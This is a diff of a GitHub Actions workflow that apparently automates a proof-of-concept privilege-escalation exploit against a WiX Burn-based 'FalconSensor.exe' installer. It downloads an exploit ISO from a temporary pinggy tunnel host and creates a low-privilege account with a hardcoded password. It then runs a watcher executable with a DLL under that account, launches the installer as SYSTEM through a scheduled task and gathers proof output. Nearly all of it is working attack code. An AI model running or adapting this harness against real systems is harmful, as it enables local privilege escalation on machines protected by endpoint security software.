@@ -12,7 +12,7 @@ jobs:
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Stop'
-          $u = 'http://rqjsr-2600-1f18-68f7-2200-4028-fbad-6739-a69.run.pinggy-free.link:41423/falcon-wix-poc.iso'
+          $u = 'http://awqhq-2600-1f18-68f7-2200-4028-a0ee-80f3-3d13.run.pinggy-free.link:32953/falcon-wix-poc.iso'
           Invoke-WebRequest -Uri $u -OutFile "$env:RUNNER_TEMP\falcon-wix-poc.iso"
           $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc.iso" -Algorithm SHA256).Hash.ToLower()
           Write-Host "ISO SHA256=$h"
@@ -34,16 +34,17 @@ jobs:
           cmd /c 'icacls C:\poc\results /grant:r Users:(OI)(CI)M'
           $pw='Burn-PoC-2026!'
           net user burnlow $pw /add
-          net localgroup Administrators burnlow /delete 2>$null
-          $lowAction=New-ScheduledTaskAction -Execute 'C:\poc\readonly\watcher.exe' -Argument 'C:\poc\readonly\fgba.dll'
-          $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
-          Register-ScheduledTask -TaskName BurnLowWatcher -Action $lowAction -Trigger $trigger -User "$env:COMPUTERNAME\burnlow" -Password $pw -RunLevel Limited -Force | Out-Null
-          Start-ScheduledTask -TaskName BurnLowWatcher
+          $secure=ConvertTo-SecureString $pw -AsPlainText -Force
+          $cred=[pscredential]::new("$env:COMPUTERNAME\burnlow",$secure)
+          $low=Start-Process -FilePath 'C:\poc\readonly\watcher.exe' -ArgumentList 'C:\poc\readonly\fgba.dll' -Credential $cred -WindowStyle Hidden -PassThru
+          Write-Host "Started low watcher PID=$($low.Id)"
           Start-Sleep -Seconds 3
+          $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
           $sysAction=New-ScheduledTaskAction -Execute 'C:\poc\readonly\FalconSensor.exe' -Argument '/help'
           Register-ScheduledTask -TaskName BurnSystemInstaller -Action $sysAction -Trigger $trigger -User 'SYSTEM' -RunLevel Highest -Force | Out-Null
           Start-ScheduledTask -TaskName BurnSystemInstaller
           Start-Sleep -Seconds 45
+          exit 0
       - name: Collect proof
         if: always()
         shell: pwsh
@@ -56,7 +57,6 @@ jobs:
           "--- burnlow ---" | Add-Content $out
           cmd /c 'net user burnlow' | Add-Content $out
           "--- tasks ---" | Add-Content $out
-          schtasks /query /tn BurnLowWatcher /v /fo list | Add-Content $out
           schtasks /query /tn BurnSystemInstaller /v /fo list | Add-Content $out
           "--- protected input ACL and hash ---" | Add-Content $out
           icacls C:\poc\readonly\FalconSensor.exe | Add-Content $out
